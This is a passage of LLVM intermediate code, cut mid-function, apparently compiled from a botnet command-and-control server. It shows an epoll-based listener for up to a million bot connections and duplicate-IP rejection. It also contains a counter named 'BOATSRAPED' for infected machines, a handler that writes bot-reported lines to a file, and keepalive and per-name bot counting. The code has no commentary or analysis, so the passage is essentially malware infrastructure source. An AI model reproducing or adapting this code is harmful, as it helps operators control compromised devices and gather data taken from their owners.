  %55 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %52, i64 %54
  %56 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %55, i32 0, i32 0
  %57 = load i32, i32* %56, align 1
  %58 = and i32 %57, 1
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %79, label %60

; <label>:60:                                     ; preds = %51, %42, %33
  %61 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %62 = load i32, i32* %8, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %61, i64 %63
  %65 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %64, i32 0, i32 1
  %66 = bitcast %union.epoll_data* %65 to i32*
  %67 = load i32, i32* %66, align 1
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %68
  %70 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %69, i32 0, i32 3
  store i8 0, i8* %70, align 1
  %71 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %72 = load i32, i32* %8, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %71, i64 %73
  %75 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %74, i32 0, i32 1
  %76 = bitcast %union.epoll_data* %75 to i32*
  %77 = load i32, i32* %76, align 1
  %78 = call i32 @close(i32 %77)
  br label %341

; <label>:79:                                     ; preds = %51
  %80 = load volatile i32, i32* @listenFD, align 4
  %81 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %82 = load i32, i32* %8, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %81, i64 %83
  %85 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %84, i32 0, i32 1
  %86 = bitcast %union.epoll_data* %85 to i32*
  %87 = load i32, i32* %86, align 1
  %88 = icmp eq i32 %80, %87
  br i1 %88, label %89, label %239

; <label>:89:                                     ; preds = %79
  br label %90

; <label>:90:                                     ; preds = %233, %209, %206, %89
  store i32 16, i32* %10, align 4
  %91 = load volatile i32, i32* @listenFD, align 4
  %92 = call i32 @accept(i32 %91, %struct.sockaddr* %9, i32* %10)
  store i32 %92, i32* %11, align 4
  %93 = load i32, i32* %11, align 4
  %94 = icmp eq i32 %93, -1
  br i1 %94, label %95, label %105

; <label>:95:                                     ; preds = %90
  %96 = call i32* @__errno_location() #9
  %97 = load i32, i32* %96, align 4
  %98 = icmp eq i32 %97, 11
  br i1 %98, label %103, label %99

; <label>:99:                                     ; preds = %95
  %100 = call i32* @__errno_location() #9
  %101 = load i32, i32* %100, align 4
  %102 = icmp eq i32 %101, 11
  br i1 %102, label %103, label %104

; <label>:103:                                    ; preds = %99, %95
  br label %238

; <label>:104:                                    ; preds = %99
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0))
  br label %238

; <label>:105:                                    ; preds = %90
  %106 = bitcast %struct.sockaddr* %9 to %struct.sockaddr_in*
  %107 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %106, i32 0, i32 2
  %108 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %107, i32 0, i32 0
  %109 = load i32, i32* %108, align 2
  %110 = load i32, i32* %11, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %111
  %113 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %112, i32 0, i32 0
  store i32 %109, i32* %113, align 4
  %114 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %114, i8 0, i64 200, i32 16, i1 false)
  %115 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %116 = load i32, i32* %11, align 4
  %117 = call i32 @fdgets(i8* %115, i32 200, i32 %116)
  %118 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %119 = call i8* @strstr(i8* %118, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0)) #8
  %120 = icmp ne i8* %119, null
  br i1 %120, label %121, label %166

; <label>:121:                                    ; preds = %105
  %122 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  call void @trim(i8* %122)
  %123 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  call void @removestr(i8* %123, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0))
  %124 = load i32, i32* %11, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %125
  %127 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %126, i32 0, i32 2
  %128 = getelementptr inbounds [512 x i8], [512 x i8]* %127, i32 0, i32 0
  %129 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %130 = call i8* @strcpy(i8* %128, i8* %129) #7
  store i32 0, i32* %14, align 4
  br label %131

; <label>:131:                                    ; preds = %162, %121
  %132 = load i32, i32* %14, align 4
  %133 = icmp slt i32 %132, 40
  br i1 %133, label %134, label %165

; <label>:134:                                    ; preds = %131
  %135 = load i32, i32* %14, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %136
  %138 = getelementptr inbounds %struct.name, %struct.name* %137, i32 0, i32 0
  %139 = getelementptr inbounds [512 x i8], [512 x i8]* %138, i32 0, i32 0
  %140 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %141 = call i32 @strcmp(i8* %139, i8* %140) #8
  %142 = icmp ne i32 %141, 0
  br i1 %142, label %145, label %143

; <label>:143:                                    ; preds = %134
  %144 = call i32 @usleep(i32 40000)
  br label %165

; <label>:145:                                    ; preds = %134
  %146 = load i32, i32* %14, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %147
  %149 = getelementptr inbounds %struct.name, %struct.name* %148, i32 0, i32 0
  %150 = getelementptr inbounds [512 x i8], [512 x i8]* %149, i32 0, i32 0
  %151 = call i64 @strlen(i8* %150) #8
  %152 = icmp ule i64 %151, 0
  br i1 %152, label %153, label %161

; <label>:153:                                    ; preds = %145
  %154 = load i32, i32* %14, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %155
  %157 = getelementptr inbounds %struct.name, %struct.name* %156, i32 0, i32 0
  %158 = getelementptr inbounds [512 x i8], [512 x i8]* %157, i32 0, i32 0
  %159 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %160 = call i8* @strcpy(i8* %158, i8* %159) #7
  br label %165

; <label>:161:                                    ; preds = %145
  br label %162

; <label>:162:                                    ; preds = %161
  %163 = load i32, i32* %14, align 4
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %14, align 4
  br label %131

; <label>:165:                                    ; preds = %153, %143, %131
  br label %166

; <label>:166:                                    ; preds = %165, %105
  store i32 0, i32* %15, align 4
  store i32 0, i32* %12, align 4
  br label %167

; <label>:167:                                    ; preds = %196, %166
  %168 = load i32, i32* %12, align 4
  %169 = icmp slt i32 %168, 1000000
  br i1 %169, label %170, label %199

; <label>:170:                                    ; preds = %167
  %171 = load i32, i32* %12, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %172
  %174 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %173, i32 0, i32 3
  %175 = load i8, i8* %174, align 1
  %176 = icmp ne i8 %175, 0
  br i1 %176, label %177, label %181

; <label>:177:                                    ; preds = %170
  %178 = load i32, i32* %12, align 4
  %179 = load i32, i32* %11, align 4
  %180 = icmp eq i32 %178, %179
  br i1 %180, label %181, label %182

; <label>:181:                                    ; preds = %177, %170
  br label %196

; <label>:182:                                    ; preds = %177
  %183 = load i32, i32* %12, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %184
  %186 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %185, i32 0, i32 0
  %187 = load i32, i32* %186, align 4
  %188 = load i32, i32* %11, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %189
  %191 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %190, i32 0, i32 0
  %192 = load i32, i32* %191, align 4
  %193 = icmp eq i32 %187, %192
  br i1 %193, label %194, label %195

; <label>:194:                                    ; preds = %182
  store i32 1, i32* %15, align 4
  br label %199

; <label>:195:                                    ; preds = %182
  br label %196

; <label>:196:                                    ; preds = %195, %181
  %197 = load i32, i32* %12, align 4
  %198 = add nsw i32 %197, 1
  store i32 %198, i32* %12, align 4
  br label %167

; <label>:199:                                    ; preds = %194, %167
  %200 = load i32, i32* %15, align 4
  %201 = icmp ne i32 %200, 0
  br i1 %201, label %202, label %212

; <label>:202:                                    ; preds = %199
  %203 = load i32, i32* %11, align 4
  %204 = call i64 @send(i32 %203, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i32 0, i32 0), i64 8, i32 16384)
  %205 = icmp eq i64 %204, -1
  br i1 %205, label %206, label %209

; <label>:206:                                    ; preds = %202
  %207 = load i32, i32* %11, align 4
  %208 = call i32 @close(i32 %207)
  br label %90

; <label>:209:                                    ; preds = %202
  %210 = load i32, i32* %11, align 4
  %211 = call i32 @close(i32 %210)
  br label %90

; <label>:212:                                    ; preds = %199
  %213 = load i32, i32* %11, align 4
  %214 = call i32 @make_socket_non_blocking(i32 %213)
  store i32 %214, i32* %6, align 4
  %215 = load i32, i32* %6, align 4
  %216 = icmp eq i32 %215, -1
  br i1 %216, label %217, label %220

; <label>:217:                                    ; preds = %212
  %218 = load i32, i32* %11, align 4
  %219 = call i32 @close(i32 %218)
  br label %238

; <label>:220:                                    ; preds = %212
  %221 = load i32, i32* %11, align 4
  %222 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 1
  %223 = bitcast %union.epoll_data* %222 to i32*
  store i32 %221, i32* %223, align 1
  %224 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 0
  store i32 -2147483647, i32* %224, align 1
  %225 = load volatile i32, i32* @epollFD, align 4
  %226 = load i32, i32* %11, align 4
  %227 = call i32 @epoll_ctl(i32 %225, i32 1, i32 %226, %struct.epoll_event* %4) #7
  store i32 %227, i32* %6, align 4
  %228 = load i32, i32* %6, align 4
  %229 = icmp eq i32 %228, -1
  br i1 %229, label %230, label %233

; <label>:230:                                    ; preds = %220
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  %231 = load i32, i32* %11, align 4
  %232 = call i32 @close(i32 %231)
  br label %238

; <label>:233:                                    ; preds = %220
  %234 = load i32, i32* %11, align 4
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %235
  %237 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %236, i32 0, i32 3
  store i8 1, i8* %237, align 1
  br label %90

; <label>:238:                                    ; preds = %230, %217, %104, %103
  br label %341

; <label>:239:                                    ; preds = %79
  %240 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %241 = load i32, i32* %8, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %240, i64 %242
  %244 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %243, i32 0, i32 1
  %245 = bitcast %union.epoll_data* %244 to i32*
  %246 = load i32, i32* %245, align 1
  store i32 %246, i32* %16, align 4
  %247 = load i32, i32* %16, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %248
  store %struct.clientdata_t* %249, %struct.clientdata_t** %17, align 8
  store i32 0, i32* %18, align 4
  %250 = load %struct.clientdata_t*, %struct.clientdata_t** %17, align 8
  %251 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %250, i32 0, i32 3
  store i8 1, i8* %251, align 1
  br label %252

; <label>:252:                                    ; preds = %329, %239
  %253 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %253, i8 0, i64 2048, i32 16, i1 false)
  br label %254

; <label>:254:                                    ; preds = %314, %310, %305, %290, %276, %252
  %255 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %255, i8 0, i64 2048, i32 16, i1 false)
  %256 = icmp ne i8* %255, null
  br i1 %256, label %257, label %263

; <label>:257:                                    ; preds = %254
  %258 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %259 = load i32, i32* %16, align 4
  %260 = call i32 @fdgets(i8* %258, i32 2048, i32 %259)
  %261 = sext i32 %260 to i64
  store i64 %261, i64* %19, align 8
  %262 = icmp sgt i64 %261, 0
  br label %263

; <label>:263:                                    ; preds = %257, %254
  %264 = phi i1 [ false, %254 ], [ %262, %257 ]
  br i1 %264, label %265, label %315

; <label>:265:                                    ; preds = %263
  %266 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %267 = call i8* @strstr(i8* %266, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0)) #8
  %268 = icmp eq i8* %267, null
  br i1 %268, label %269, label %270

; <label>:269:                                    ; preds = %265
  store i32 1, i32* %18, align 4
  br label %315

; <label>:270:                                    ; preds = %265
  %271 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  call void @trim(i8* %271)
  %272 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %273 = call i8* @strstr(i8* %272, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0)) #8
  %274 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %275 = icmp eq i8* %273, %274
  br i1 %275, label %276, label %285

; <label>:276:                                    ; preds = %270
  %277 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %278 = call i8* @strstr(i8* %277, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0)) #8
  %279 = getelementptr inbounds i8, i8* %278, i64 7
  store i8* %279, i8** %21, align 8
  %280 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %281 = load i8*, i8** %21, align 8
  %282 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %280, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i32 0, i32 0), i8* %281)
  %283 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %284 = call i32 @fflush(%struct._IO_FILE* %283)
  br label %254

; <label>:285:                                    ; preds = %270
  %286 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %287 = call i8* @strstr(i8* %286, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0)) #8
  %288 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %289 = icmp eq i8* %287, %288
  br i1 %289, label %290, label %296

; <label>:290:                                    ; preds = %285
  %291 = load volatile i32, i32* @BOATSRAPED, align 4
  %292 = add nsw i32 %291, 1
  store volatile i32 %292, i32* @BOATSRAPED, align 4
  %293 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %294 = call i8* @strstr(i8* %293, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0)) #8
  %295 = getelementptr inbounds i8, i8* %294, i64 11
  store i8* %295, i8** %22, align 8
  br label %254

; <label>:296:                                    ; preds = %285
  %297 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %298 = call i32 @strcmp(i8* %297, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %299 = icmp eq i32 %298, 0
  br i1 %299, label %300, label %306

; <label>:300:                                    ; preds = %296
  %301 = load i32, i32* %16, align 4
  %302 = call i64 @send(i32 %301, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i32 0, i32 0), i64 5, i32 16384)
  %303 = icmp eq i64 %302, -1
  br i1 %303, label %304, label %305

; <label>:304:                                    ; preds = %300
  store i32 1, i32* %18, align 4
  br label %315

; <label>:305:                                    ; preds = %300
  br label %254

; <label>:306:                                    ; preds = %296
  %307 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %308 = call i32 @strcmp(i8* %307, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i32 0, i32 0)) #8
  %309 = icmp eq i32 %308, 0
  br i1 %309, label %310, label %311

; <label>:310:                                    ; preds = %306
  br label %254

; <label>:311:                                    ; preds = %306
  %312 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %313 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.14, i32 0, i32 0), i8* %312)
  br label %314

; <label>:314:                                    ; preds = %311
  br label %254

; <label>:315:                                    ; preds = %304, %269, %263
  %316 = load i64, i64* %19, align 8
  %317 = icmp eq i64 %316, -1
  br i1 %317, label %318, label %324

; <label>:318:                                    ; preds = %315
  %319 = call i32* @__errno_location() #9
  %320 = load i32, i32* %319, align 4
  %321 = icmp ne i32 %320, 11
  br i1 %321, label %322, label %323

; <label>:322:                                    ; preds = %318
  store i32 1, i32* %18, align 4
  br label %323

; <label>:323:                                    ; preds = %322, %318
  br label %330

; <label>:324:                                    ; preds = %315
  %325 = load i64, i64* %19, align 8
  %326 = icmp eq i64 %325, 0
  br i1 %326, label %327, label %328

; <label>:327:                                    ; preds = %324
  store i32 1, i32* %18, align 4
  br label %330

; <label>:328:                                    ; preds = %324
  br label %329

; <label>:329:                                    ; preds = %328
  br label %252

; <label>:330:                                    ; preds = %327, %323
  %331 = load i32, i32* %18, align 4
  %332 = icmp ne i32 %331, 0
  br i1 %332, label %333, label %338

; <label>:333:                                    ; preds = %330
  %334 = load %struct.clientdata_t*, %struct.clientdata_t** %17, align 8
  %335 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %334, i32 0, i32 3
  store i8 0, i8* %335, align 1
  %336 = load i32, i32* %16, align 4
  %337 = call i32 @close(i32 %336)
  br label %338

; <label>:338:                                    ; preds = %333, %330
  br label %339

; <label>:339:                                    ; preds = %338
  br label %340

; <label>:340:                                    ; preds = %339
  br label %341

; <label>:341:                                    ; preds = %340, %238, %60
  %342 = load i32, i32* %8, align 4
  %343 = add nsw i32 %342, 1
  store i32 %343, i32* %8, align 4
  br label %29

; <label>:344:                                    ; preds = %29
  br label %25
                                                  ; No predecessors!
  %346 = load i8*, i8** %2, align 8
  ret i8* %346
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #4

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #3

declare void @perror(i8*) #1

declare i32 @usleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @make_socket_non_blocking(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

; <label>:10:                                     ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %21

; <label>:11:                                     ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %21

; <label>:20:                                     ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

; <label>:21:                                     ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #4

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

declare i32 @printf(i8*, ...) #1

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

; <label>:3:                                      ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

; <label>:6:                                      ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 3
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

; <label>:13:                                     ; preds = %6
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

; <label>:17:                                     ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3

; <label>:20:                                     ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define i32 @joinn() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [1000000 x i8], align 16
  store i32 0, i32* %4, align 4
  br label %6

; <label>:6:                                      ; preds = %14, %0
  %7 = load i32, i32* %4, align 4
  %8 = icmp slt i32 %7, 40
  br i1 %8, label %9, label %17

; <label>:9:                                      ; preds = %6
  %10 = load i32, i32* %4, align 4
  %11 = sext i32 %10 to i64
  %12 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %11
  %13 = getelementptr inbounds %struct.name, %struct.name* %12, i32 0, i32 1
  store i32 0, i32* %13, align 4
  br label %14

; <label>:14:                                     ; preds = %9
  %15 = load i32, i32* %4, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %4, align 4
  br label %6

; <label>:17:                                     ; preds = %6
  store i32 0, i32* %2, align 4
  br label %18

; <label>:18:                                     ; preds = %58, %17
  %19 = load i32, i32* %2, align 4
  %20 = icmp slt i32 %19, 1000000
  br i1 %20, label %21, label %61

; <label>:21:                                     ; preds = %18
  store i32 0, i32* %3, align 4
  br label %22

; <label>:22:                                     ; preds = %54, %21
  %23 = load i32, i32* %3, align 4
  %24 = icmp slt i32 %23, 40
  br i1 %24, label %25, label %57

; <label>:25:                                     ; preds = %22
  %26 = load i32, i32* %2, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %27
  %29 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %28, i32 0, i32 2
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %29, i32 0, i32 0
  %31 = load i32, i32* %3, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %32
  %34 = getelementptr inbounds %struct.name, %struct.name* %33, i32 0, i32 0
  %35 = getelementptr inbounds [512 x i8], [512 x i8]* %34, i32 0, i32 0
  %36 = call i32 @strcmp(i8* %30, i8* %35) #8
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %38, label %53

; <label>:38:                                     ; preds = %25
  %39 = load i32, i32* %2, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %40
  %42 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %41, i32 0, i32 3
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 1
  br i1 %45, label %46, label %53

; <label>:46:                                     ; preds = %38
  %47 = load i32, i32* %3, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %48
  %50 = getelementptr inbounds %struct.name, %struct.name* %49, i32 0, i32 1
  %51 = load i32, i32* %50, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %50, align 4
  br label %53

; <label>:53:                                     ; preds = %46, %38, %25
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = load i32, i32* %3, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %3, align 4
  br label %22

; <label>:57:                                     ; preds = %22
  br label %58

; <label>:58:                                     ; preds = %57
  %59 = load i32, i32* %2, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %2, align 4
  br label %18

; <label>:61:                                     ; preds = %18
  %62 = load i32, i32* %1, align 4
  ret i32 %62
}

; Function Attrs: noinline nounwind uwtable
define i32 @Search_in_File(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

; <label>:11:                                     ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

; <label>:12:                                     ; preds = %1
  br label %13

; <label>:13:                                     ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

; <label>:18:                                     ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

; <label>:23:                                     ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

; <label>:27:                                     ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13

; <label>:30:                                     ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

; <label>:33:                                     ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

; <label>:36:                                     ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

; <label>:40:                                     ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

; <label>:42:                                     ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

